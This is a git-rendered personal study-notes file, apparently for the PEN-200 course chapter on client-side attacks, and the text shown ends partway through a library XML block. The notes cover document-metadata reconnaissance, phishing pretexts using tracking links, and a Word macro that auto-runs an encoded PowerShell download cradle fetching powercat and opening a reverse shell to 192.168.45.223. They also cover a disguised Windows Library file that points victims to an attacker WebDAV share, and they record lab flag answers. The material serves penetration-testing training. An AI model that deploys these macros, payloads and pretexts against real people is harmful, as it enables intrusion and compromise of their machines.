@@ -1,0 +1,971 @@
+
+    <article class="git-file-panel" data-git-panel-section="blob" data-git-fragment-path="git/cm-blog-content-staging/blob/sources/OffSec/PEN-200 C. 11.md/index.html" data-git-raw-path="git/cm-blog-content-staging/blob/sources/OffSec/PEN-200 C. 11.md/raw.txt" data-git-line-count="853">
+      <header class="git-file-header">
+        <div class="git-file-header-main">
+          <h4 class="git-file-title">PEN-200 C. 11.md</h4>
+          <div class="git-file-meta">36 KB · 853 lines · sources/OffSec/PEN-200 C. 11.md</div>
+        </div>
+        <div class="git-file-actions">
+          <a class="git-file-action git-file-action--raw" href="./git/cm-blog-content-staging/blob/sources/OffSec/PEN-200 C. 11.md/raw.txt" target="_blank" rel="noopener">Raw</a>
+          <button type="button" class="git-file-action git-file-action--copy" data-git-file-copy>Copy</button>
+        </div>
+      </header>
+      <div class="git-file-body" data-git-file-body>
+        <hr>
+<h2>title: PEN-200 C. 11
+updated: 2023-09-09 21:00:38Z
+created: 2023-09-06 21:57:15Z
+latitude: 33.86223660
+longitude: -118.39951940
+altitude: 0.0000</h2>
+<h2>Client Side Attacks</h2>
+<ul>
+<li>Target Reconnaissance</li>
+<li>Exploiting Microsoft Office</li>
+<li>Abusing Windows Library Files</li>
+</ul>
+<h3>11.1 Target Reconnaissance</h3>
+<ul>
+<li>Gather information to prepare client-side attacks</li>
+<li>Leverage client fingerprinting to obtain information</li>
+</ul>
+<h3>Information Gathering</h3>
+<ul>
+<li>Methods of enumerating targets installed software without interacting directly<ul>
+<li>Suited for cases where we have no way to interact</li>
+<li>We wil not alert monitoring systems or leave forensic traces</li>
+</ul>
+</li>
+</ul>
+<p><strong>Metadata of publicly available docs</strong></p>
+<ul>
+<li><a href="https://exiftool.org/TagNames/">Metadata</a> can be sanitized, but is often not</li>
+<li>tags categorized by <a href="https://exiftool.org/#Tag%20Groups">tag groups</a><ul>
+<li>can include;<ul>
+<li>author</li>
+<li>creation date</li>
+<li>name and version of software used to create the doc</li>
+<li>OS of client</li>
+<li>etc.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Data is sometimes;<ul>
+<li>explicitly stored in metadata</li>
+<li>infered from the doc iteself</li>
+</ul>
+</li>
+<li>Keep in mind<ul>
+<li>This information can be stale</li>
+<li>Diff branches of the same org may use diff software</li>
+</ul>
+</li>
+<li>This approach is &quot;hands-off&quot;<ul>
+<li>We may not gather accurate info</li>
+<li>Still a viable and effective approach</li>
+</ul>
+</li>
+</ul>
+<p><strong>Techniques</strong></p>
+<ul>
+<li>Leverage inforamtion gathering methods<ul>
+<li>Google dorking<ul>
+<li><code>site:example.com filetype:pdf</code></li>
+<li>Finds PDFs on target webpage</li>
+<li>Adding keywords to narrow results</li>
+</ul>
+</li>
+<li>Website enumeration tools<ul>
+<li><a href="https://github.com/OJ/gobuster">gobuster</a><ul>
+<li><code>-x</code> param to search for specific file extensions on target site</li>
+<li>However this is noisy and will generate log entries</li>
+</ul>
+</li>
+<li>Can also manually browse taget site</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Example:</strong></p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/client-side]
+└─$ exiftool -a -u brochure.pdf 
+ExifTool Version Number         : 12.65
+File Name                       : brochure.pdf
+Directory                       : .
+File Size                       : 311 kB
+File Modification Date/Time     : 2023:09:07 07:50:49-07:00
+File Access Date/Time           : 2023:09:07 07:50:49-07:00
+File Inode Change Date/Time     : 2023:09:07 07:50:52-07:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 4
+Language                        : de-DE
+Tagged PDF                      : Yes
+XMP Toolkit                     : Image::ExifTool 12.41
+Creator                         : Stanley Yelnats
+Title                           : Mountain Vegetables
+Author                          : Stanley Yelnats
+Producer                        : Microsoft® PowerPoint® for Microsoft 365
+Create Date                     : 2022:04:27 07:34:01+02:00
+Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
+Modify Date                     : 2022:04:27 07:34:01+02:00
+Document ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
+Instance ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
+Title                           : Mountain Vegetables
+Author                          : Stanley Yelnats
+Create Date                     : 2022:04:27 07:34:01+02:00
+Modify Date                     : 2022:04:27 07:34:01+02:00
+Producer                        : Microsoft® PowerPoint® for Microsoft 365
+Creator                         : Stanley Yelnats
+</code></pre>
+<ul>
+<li>Important info;<ul>
+<li>creation date</li>
+<li>last modified date<ul>
+<li>date sections reveal relative age of doc</li>
+<li>recent dates indicate information is likely current</li>
+</ul>
+</li>
+<li>author&#39;s name<ul>
+<li>Employee name can be used to establish a trust reltionship<ul>
+<li>Drop their name casualy in target email or phone call</li>
+<li>Especially helpful if author maintains a small public profile</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>operating system</li>
+<li>application used to create the doc<ul>
+<li>Reveals PDF was created with &quot;Microsoft Powerpoint for Microsoft 365&quot;<ul>
+<li>Crucial for planning since there is no mention of Mac or macOS in tags</li>
+<li>Probable that Windows was used</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>With this info we can now leverage client-side attack vectors from Windows System Components to maliscious Office Docs.</p>
+<h4>Information Gathering Exercises</h4>
+<p>Download old.pdf from the Mountain Vegetables website on VM #1 by clicking on the OLD button. Use exiftool to review the file&#39;s metadata. Enter the value of the Author tag.</p>
+<pre><code>OS{f678c053253b0510a2c0b218bf47709c}
+</code></pre>
+<p>Start VM #2 and use gobuster to bruteforce the contents of the web server. Specify &quot;pdf&quot; as the filetype and find a document other than old.pdf and brochure.pdf. After you identify the file, download it and extract the flag in the metadata.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec]
+└─$ exiftool -a -u info.pdf             
+ExifTool Version Number         : 12.65
+File Name                       : info.pdf
+Directory                       : .
+File Size                       : 310 kB
+File Modification Date/Time     : 2023:09:07 08:02:24-07:00
+File Access Date/Time           : 2023:09:07 08:08:43-07:00
+File Inode Change Date/Time     : 2023:09:07 08:08:43-07:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 4
+Language                        : de-DE
+Tagged PDF                      : Yes
+XMP Toolkit                     : Image::ExifTool 11.88
+Description                     : OS{e0a979b57fd890dfa555f1846e3e3a64}
+</code></pre>
+<h3>Client Fingerprinting</h3>
+<ul>
+<li>Client Fingerprinting to obtain OS and browser info from target in non-routable internal network<ul>
+<li><a href="https://en.wikipedia.org/wiki/Device_fingerprint">Device Fingerprinting</a></li>
+</ul>
+</li>
+<li>Example;<ul>
+<li>We may be tasked to establish a foothold on a target network for a pentest</li>
+<li>Assume we previously extracted a target email<ul>
+<li><a href="https://github.com/laramies/theHarvester">theHarvester</a></li>
+</ul>
+</li>
+<li>We could use <a href="https://msdn.microsoft.com/en-us/library/ms536496%28VS.85%29.aspx" title="https://msdn.microsoft.com/en-us/library/ms536496(VS.85).aspx">HTML Application (HTA)</a></li>
+</ul>
+</li>
+<li>Before we attack, we have to confirm out target is;<ul>
+<li>Running Windows</li>
+<li>Has IE or MS Edge enabled</li>
+</ul>
+</li>
+<li>For this purpose we can use <a href="https://canarytokens.com/">Canarytokens</a><ul>
+<li>generates link with embeded token that we send to target</li>
+<li>when target opens, we get;<ul>
+<li>Info about their browser</li>
+<li>IP address</li>
+<li>OS</li>
+</ul>
+</li>
+<li>With this info we can confirm the target is running Win and verify if we should attempt HTA client-side attack</li>
+</ul>
+</li>
+</ul>
+<p>Before we create a tracking link, understand the <a href="https://www.imperva.com/learn/application-security/pretexting/">pretexts</a>. We can&#39;t just ask a target to click a link in an arbitrary email, so we must create a context, perhaps by leveraging the target&#39;s job role.</p>
+<ul>
+<li>Assume the target is working in a finance department</li>
+<li>We could say we recieved an invoice, but it contains a financial error</li>
+<li>Offer a link that we say opens a screenshot with the error highlighted<ul>
+<li>This is the canarytoken link</li>
+<li>When the target clicks the link we get our info and they get a blank page</li>
+</ul>
+</li>
+<li>With our pretext defined, visit the <a href="https://canarytokens.org/generate">Canarytoken generation page</a><ul>
+<li>Web form provides dropdown to select type of tracking token to gen</li>
+<li>Enter email address or webhook URL for alerts</li>
+<li>To test;<ul>
+<li>Select <code>Web bug/ URL</code> token</li>
+<li>Enter <a href="https://example.com">https://example.com</a> as webhook URL</li>
+<li>Enter Fingerprinting as comment</li>
+<li>Click &quot;Create my Canarytoke&quot;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>http://canarytokens.com/tags/static/8jcpijj1da6phaduilhs51607/index.html
+</code></pre>
+<ul>
+<li>Confirmation page contains tracking link</li>
+<li>Also provides ideas on how to get target to click link</li>
+<li>Next, click &quot;Manage this token&quot;<ul>
+<li>Shows options for token</li>
+</ul>
+</li>
+<li>&quot;History&quot; shows all visitors that clicked our token link<ul>
+<li>Once triggered we can retrieve information about the target systems</li>
+</ul>
+</li>
+<li>The JS fingerprinting code more accurately IDs the OS and browser<ul>
+<li>user-agent can be spoofed and not always accurate</li>
+</ul>
+</li>
+</ul>
+<p>Canarytoken provides other fingerprinting techniques as well.</p>
+<ul>
+<li>embed in Word Doc or PDF</li>
+<li>embed into image &lt;---- more convincing to target</li>
+</ul>
+<p>Alternate options;</p>
+<ul>
+<li><a href="https://grabify.link/">Grabify</a></li>
+<li><a href="https://github.com/fingerprintjs/fingerprintjs">fingerprint.js</a></li>
+</ul>
+<h4>Client Fingerprinting Exercises</h4>
+<p>Reproduce the steps from this section by opening the link yourself. Open the link one time with an enabled AdBlocker and one time with a disabled AdBlocker. Answer true or false: There is no difference in the results regarding enabled or disabled AdBlocker.</p>
+<pre><code>False, although no difference was noted in Chrome Linux
+</code></pre>
+<h2>11.2 Exploiting Microsoft Office</h2>
+<ul>
+<li>Understand variations of Microsoft Office client-side attacks</li>
+<li>Install Microsoft Office</li>
+<li>Leverage Microsoft Word Macros</li>
+</ul>
+<h3>Preparing the Attack</h3>
+<p>Important considerations when using malicious Office Doc in a client-side attack.</p>
+<ul>
+<li>Delivery method<ul>
+<li>Macro attacks are well known, email provider spam filters often filter out all MS Office Docs<ul>
+<li>In most cases we can&#39;t just send it as an email attachment</li>
+</ul>
+</li>
+<li>Most anti-phishing training programs stress the danger of enabling macros in an emailed Office Doc</li>
+</ul>
+</li>
+</ul>
+<p>To deliver the Doc and increase the chance of target opening it, we have to use a convincing pretext and an alternate delivery method. A download link for example.</p>
+<p>If succesfully delivered and opened, the doc will be tagged with the <a href="https://attack.mitre.org/techniques/T1553/005/">&quot;Mark of the Web&quot; (MOTW)</a>. An Office doc tagged with MOTW will open in a <a href="https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653">protected view</a> which disabled editing and blocks the execution of macros or embedded objects. When a target opens a MOTW Doc, they see a warning with the option to Enable Editing.</p>
+<p>When the target enables editing, the protected view is disabled. The most direct way to bypass MOTW is to convince the target to click Enable Editing.</p>
+<ul>
+<li>Example;<ul>
+<li>Blur the body of the doc and intruct the target to click the Enable Editing button to view it.</li>
+</ul>
+</li>
+</ul>
+<p>Not all Office docs have a protected view, Microsoft Publisher does not but is less frequently present on a system.</p>
+<p>Microsoft also announced blocking macros by default. Affecting Access, Excel, PowerPoint, Visio, and Word in most Office versions from 2013-2021. Dates can be found in <a href="https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked">MS Learn page</a>.</p>
+<p>The Enable Content button is no longer available for Office docs delivered from the internet. A more tedious process of following a link outlining the dangers, following instructions, and checking a box in settings. This complicated the vector, but with thorough enumeration and considering the information here the chance of success increases greatly.</p>
+<p>Despite the mitigation and heightened awareness, malicious Office Docs are still one of the most widely used client-side attack vectors. This highlights the dynamic between attacker and defender. For each security measure implemented the attacker is forced to develop a novel vectors and bypass methods. New defense mechanisms are just opportunities to develop more sophisticated attacks.</p>
+<h3>Leveraging Microsoft Word Macros</h3>
+<ul>
+<li>Office apps like Word and Excel allow users to embed macros<ul>
+<li>Macros execute a series of commands/instructions</li>
+<li>Orgs use macros to manage dynamic content and link docs to external content</li>
+</ul>
+</li>
+<li><em>Macros can be written from scratch in <a href="https://docs.microsoft.com/en-us/office/vba/api/overview/">Visual Basic for Applications (VBA)</a>, which is a powerful scripting language with full access to <a href="https://en.wikipedia.org/wiki/ActiveX">ActiveX objects</a> and the Windows Script Host, similar to JavaScript in HTML Applications.</em></li>
+</ul>
+<p>Example; we will embed a macro in a Word doc to launch a reverse shell when the document is opened. Macros are one of the oldest and most well known attack vectors and still work well today, keeping in mind the mitigation described in the previous section.</p>
+<ul>
+<li><em>Bear in mind that older client-side attack vectors, including <a href="https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN">Dynamic Data Exchange (DDE)</a> and various <a href="https://en.wikipedia.org/wiki/Object_Linking_and_Embedding">Object Linking and Embedding (OLE)</a> methods do not work well today without significant target system modification.</em></li>
+<li>Create a blank Word doc <code>mymacro</code></li>
+<li>Save it as a <code>doc</code><ul>
+<li>Newer <code>docx</code> files require a template be attached<ul>
+<li>They cannot be embeded, thus are not persistent</li>
+</ul>
+</li>
+<li>Can also use <code>docm</code></li>
+</ul>
+</li>
+<li>Click View tab</li>
+<li>Find and click the Macros button</li>
+<li>In the Macro menu<ul>
+<li>Enter macro name <code>MyMacro</code></li>
+<li>Select from Macros in drop down <code>mymacro</code> document</li>
+<li>Then click Create</li>
+</ul>
+</li>
+<li>This creates the Macro framework and opens a VB editor for us to develop our macro</li>
+<li>We can develop from scratch or use the provided skeleton<ul>
+<li>The skeleton<ul>
+<li>The main sub proceedure begins with the <code>Sub</code> keyword</li>
+<li>It ends with <code>End Sub</code></li>
+<li>This is the body of the Macro</li>
+<li><em>A sub procedure is very similar to a function in VBA. The difference lies in the fact that sub procedures cannot be used in expressions because they do not return any values, whereas functions do.</em></li>
+</ul>
+</li>
+<li>At this point <code>MyMacro()</code> is an emptly sub proceedure with several single line comments starting with <code>!</code> chars</li>
+</ul>
+</li>
+</ul>
+<pre><code>Sub MyMacro()
+&#39;
+&#39; MyMacro Macro
+&#39;
+&#39;
+
+End Sub
+</code></pre>
+<ul>
+<li>In this example we will use ActiveX Objects<ul>
+<li>They provide access to underlying system commands</li>
+<li>Achieved through the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/at5ydy31%28v=vs.84%29" title="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/at5ydy31(v=vs.84)">WScript</a> through the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99%28v=vs.84%29" title="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99(v=vs.84)">Windows Script Host Shell object</a></li>
+<li>Once the <a href="https://learn.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/createobject-function">Windows Host Shell object with CreateObject</a> you can invoke the Run method for WScript.Shell to run applications on the client machine</li>
+<li>Our first macro will start powershell</li>
+</ul>
+</li>
+</ul>
+<pre><code>Sub MyMacro()
+
+  CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;
+  
+End Sub
+</code></pre>
+<ul>
+<li>Office macros are not executed automatically<ul>
+<li>We must use the predefined AutoOpen macro and Document_Open event<ul>
+<li>This will call our proceedure and run our code when the doc is opened</li>
+<li>They differ and cover special cases which the other doesn&#39;t so use both</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>Sub AutoOpen()
+
+  MyMacro
+  
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+  
+End Sub
+
+Sub MyMacro()
+
+  CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;
+  
+End Sub
+</code></pre>
+<ul>
+<li>Save, close, and reopen the doc</li>
+<li>We must click the Enable Content button, then our macro runs opening powershell!</li>
+</ul>
+<p>We will extend the code execution of our macro to spawn a reverse shell with powercat. We will need to use a base64 download cradle to dl powercat and start the rev shell. The encoded PowerShell command will be declared as a variable in VBA.</p>
+<ul>
+<li><strong>Note that VBA has a 255 char limit for literal strings</strong> so we can&#39;t load the command as a single string<ul>
+<li>This does not apply to strings stored in variables</li>
+<li>Split the command into multiple lines and concatenate them in VB</li>
+</ul>
+</li>
+<li>Go back to our macro editor</li>
+<li>Declare a var names Str with the Dim keyword<ul>
+<li>used to store our powershell download cradle</li>
+<li>will be used to execute rev shell</li>
+</ul>
+</li>
+</ul>
+<pre><code>Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    CreateObject(&quot;Wscript.Shell&quot;).Run Str
+End Sub
+</code></pre>
+<ul>
+<li>We will need to encode this powershell command to base64</li>
+</ul>
+<pre><code>IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.223/powercat.ps1&#39;);powercat -c 192.168.45.223 -p 4444 -e powershell
+</code></pre>
+<ul>
+<li><p>Encode to Base64 string with powershell</p>
+</li>
+<li><p>Split into smaller segments of 50 chars with Python</p>
+</li>
+</ul>
+<pre><code>str = &quot;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...&quot;
+
+n = 50
+
+for i in range(0, len(str), n):
+    print(&quot;Str = Str + &quot; + &#39;&quot;&#39; + str[i:i+n] + &#39;&quot;&#39;)
+
+Str = Str + &quot;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd&quot;
+Str = Str + &quot;wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA&quot;
+Str = Str + &quot;uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA&quot;
+Str = Str + &quot;GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI&quot;
+Str = Str + &quot;ALgAxADYAOAAuADQANQAuADIAMgAzAC8AcABvAHcAZQByAGMAY&quot;
+Str = Str + &quot;QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB&quot;
+Str = Str + &quot;jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACAALQBwA&quot;
+Str = Str + &quot;CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw&quot;
+Str = Str + &quot;A&quot;
+</code></pre>
+<ul>
+<li>We can use this to update our macro</li>
+</ul>
+<pre><code>Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    Str = Str + &quot;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd&quot;
+    Str = Str + &quot;wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA&quot;
+    Str = Str + &quot;uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA&quot;
+    Str = Str + &quot;GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI&quot;
+    Str = Str + &quot;ALgAxADYAOAAuADQANQAuADIAMgAzAC8AcABvAHcAZQByAGMAY&quot;
+    Str = Str + &quot;QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB&quot;
+    Str = Str + &quot;jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACAALQBwA&quot;
+    Str = Str + &quot;CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw&quot;
+    Str = Str + &quot;A&quot;
+
+    CreateObject(&quot;Wscript.Shell&quot;).Run Str
+End Sub
+</code></pre>
+<ul>
+<li>Once the macro has been saved, start a netcast listener, and close then reopen the document<ul>
+<li>You can also run the macro from VBA editor to test the function</li>
+</ul>
+</li>
+<li>Note that once the macro warning has been enabled, it won&#39;t appear again unless the name of the doc changes</li>
+<li>Provided we get the target to run the macro, this is a very effective and reliable method</li>
+</ul>
+<h3>11.3 Abusing Windows Library Files</h3>
+<ul>
+<li>Prepare an attack with Windows library files</li>
+<li>Leverage Windows shortcuts to obtain code execution</li>
+</ul>
+<h4>Attaining Code Execution via Windows Library Files</h4>
+<p>Win Library files are virtual containers that connect users with content stored in remote locations;</p>
+<ul>
+<li>web servers</li>
+<li>shares</li>
+<li>they have a <code>.Library-ms</code> file extension</li>
+<li>are executed by double-clicking from explorer</li>
+</ul>
+<p>We will explore a 2 stage client-side attack;</p>
+<ul>
+<li>First stage;<ul>
+<li>Leverage a Win Library file to gain a foothold on a target system</li>
+<li>Use it to setup the second stage</li>
+</ul>
+</li>
+<li>Second stage;<ul>
+<li>Use the foothold to provide and executable file</li>
+<li>Spawn a reverse shell when double-clicked</li>
+</ul>
+</li>
+</ul>
+<p>First stage;</p>
+<ul>
+<li>Setup a Win Library file that connects to a WebDAV share we control</li>
+<li>The victim with receive a <code>.Library-ms</code><ul>
+<li>Through email for example</li>
+</ul>
+</li>
+<li>When the DC the file it will appear as a regular directory in explorer<ul>
+<li>We will provide a <code>.lnk</code> payload for the second stage powershell rev shell script</li>
+<li>We need to convince the user to click the <code>.lnk</code></li>
+</ul>
+</li>
+<li><em>This method is stealthier than delivering the lnk through a web server/email link since most spam filters and security appliances analyze links for suspicious content before passing them to recipient</em></li>
+<li>On the other hand, most spam/sec systems will allow Win Library files through<ul>
+<li>It also appears as a normal directory in explorer, giving the appearance of a local file</li>
+</ul>
+</li>
+<li>Setup our WebDAV share</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$ pip3 install wsgidav           
+Defaulting to user installation because normal site-packages is not writeable
+Collecting wsgidav
+  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 171.3/171.3 KB 1.6 MB/s eta 0:00:00
+...  
+Successfully installed json5-0.9.6 wsgidav-4.0.1  
+</code></pre>
+<ul>
+<li>After WsgiDAV install create <code>/home/kali/webdav</code> for the share<ul>
+<li>this will contain out <code>.lnk</code></li>
+<li>place <code>test.txt</code> there for now</li>
+<li><em>If the installation of WsgiDAV fails with error: externally-managed-environment, we can use a virtual environment or install the package python3-wsgidav with apt. In PEP 668, a change was introduced to enforce the use of virtual environments and prevent situations in which package installations via pip break the operating system.</em></li>
+</ul>
+</li>
+<li>Run WsgiDAV from the <code>/home/kali/.local/bin</code> dir or Apt install via path<ul>
+<li>Specify host to serve from <code>-H</code><ul>
+<li><code>0.0.0.0</code></li>
+</ul>
+</li>
+<li>Specify listening port <code>-p 80</code></li>
+<li>Disable auth <code>--auth anonymous</code></li>
+<li>Set WebDAV root <code>-r /home/kali/webdav</code></li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/win-library-files]
+└─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
+Running without configuration file.
+12:54:48.073 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+12:54:48.075 - INFO    : WsgiDAV/4.2.0 Python/3.11.4 Linux-6.3.0-kali1-amd64-x86_64-with-glibc2.37
+12:54:48.076 - INFO    : Lock manager:      LockManager(LockStorageDict)
+12:54:48.076 - INFO    : Property manager:  None
+12:54:48.076 - INFO    : Domain controller: SimpleDomainController()
+12:54:48.076 - INFO    : Registered DAV providers by route:
+12:54:48.076 - INFO    :   - &#39;/:dir_browser&#39;: FilesystemProvider for path &#39;/home/m4xx3d0ut/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs&#39; (Read-Only) (anonymous)
+12:54:48.076 - INFO    :   - &#39;/&#39;: FilesystemProvider for path &#39;/home/m4xx3d0ut/webdav&#39; (Read-Write) (anonymous)
+12:54:48.076 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+12:54:48.076 - WARNING : Share &#39;/&#39; will allow anonymous write access.
+12:54:48.076 - WARNING : Share &#39;/:dir_browser&#39; will allow anonymous read access.
+12:54:48.160 - INFO    : Running WsgiDAV/4.2.0 Cheroot/10.0.0 Python 3.11.4
+12:54:48.160 - INFO    : Serving on http://0.0.0.0:80 ... 
+</code></pre>
+<ul>
+<li><p>Test from local browser</p>
+</li>
+<li><p>Next we create the Win Library file from our Win VM</p>
+<ul>
+<li>Using VSCode or Notepad create text file <code>config.Library-ms</code></li>
+<li>Change the icon appearance to make it unassuming</li>
+</ul>
+</li>
+<li><p>Library files consist of 3 parts</p>
+<ul>
+<li>General Library information</li>
+<li>Library properties</li>
+<li>Library locations</li>
+<li>Refer to <a href="https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry">Library Description Schema</a> for further info</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+
+&lt;/libraryDescription&gt;
+</code></pre>
+<ul>
+<li>Set the <code>name</code> tag<ul>
+<li>NOTE this is not an arbitrary name</li>
+<li>We MUST specify the name by providing a DLL name and index</li>
+<li>We can use either name specified in MS docs;<ul>
+<li>@shell32.dll,-34575</li>
+<li>@windows.storage.dll,-34582<ul>
+<li>We will use this on to prevent filters hitting on the word <code>shell32</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>The <code>version</code> tag is set to a numerical val of our choice<ul>
+<li>i.e. - <code>6</code></li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+</code></pre>
+<ul>
+<li>Add the <code>isLibraryPinned</code> tag to <code>true</code><ul>
+<li>This pins the Lib to the nav pane of Win Explorer</li>
+<li>another small detail that makes the process more genuine to the target</li>
+</ul>
+</li>
+<li>To set the icon appearance we set <code>iconRefernce</code> the same way as we set the name<ul>
+<li>Use <code>imageres.dll</code> to choose between all Win icons</li>
+<li>index <code>-1002</code> for the Documents folder icon</li>
+<li>index <code>-1003</code> for the Pictures folder icon<ul>
+<li>This looks more benign</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+</code></pre>
+<ul>
+<li>add <code>templateInfo</code> tag which contains <code>folderType</code> tag<ul>
+<li>These determine the columns and details that appear in Explorer by default when opening the Lib</li>
+<li>The GUID must be specified using MS docs page</li>
+<li>We wil use the Documents GUID to appear convincing<ul>
+<li><code>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+</code></pre>
+<ul>
+<li>The next tag marks the beginning of the library locations section<ul>
+<li>specifies the storage location where our library points to</li>
+<li>start with the <code>searchConnectorDescriptionList</code> tag<ul>
+<li>contains a list of search connectors defined by <code>searchConnectorDescription</code><ul>
+<li>search connects are used by library files to specify connection setting of remote location</li>
+<li>we can specify one or more inside the <code>searchConnectorDescriptionList</code> tag</li>
+<li>first add the <code>isDefaultSaveLocation</code> tag set to <code>true</code><ul>
+<li>determines behavior when user saves an item</li>
+</ul>
+</li>
+<li>next add <code>isSupported</code> tag, which is NOT documented, and is used for compatibility set to <code>false</code></li>
+<li>Most important is the <code>url</code> tag pointing to our WebDAV</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.45.223&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+</code></pre>
+<ul>
+<li>Our Library is working as expected<ul>
+<li>only config is shown in the nav bar, no indication it is remote!</li>
+<li>When we reopen in editor, we see that Win modified the connection info to optimize it<ul>
+<li>New <code>serialized</code> tag added<ul>
+<li>base64-encoded info about the location of the url tag</li>
+</ul>
+</li>
+<li>the content of the <code>url</code> tag has changed to <code>\\192.168.119.2\DavWWWRoot</code> optimized for Win WebDAV Client</li>
+<li>This can cause the connection failures on the target, so revert to pre-run state before delivery</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
